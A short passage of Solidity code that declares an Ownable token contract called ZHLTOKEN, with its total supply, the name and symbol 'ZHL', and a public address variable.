...
contract ZHLTOKEN is Ownable {
    address public cazzsxe3;
    uint256 supplyamount = 10000000000*10**decimals();
    uint256 private _cctotalSupply = supplyamount;
    string private _cctokenname = "ZHL";
    string private _cctokensymbol = "ZHL";
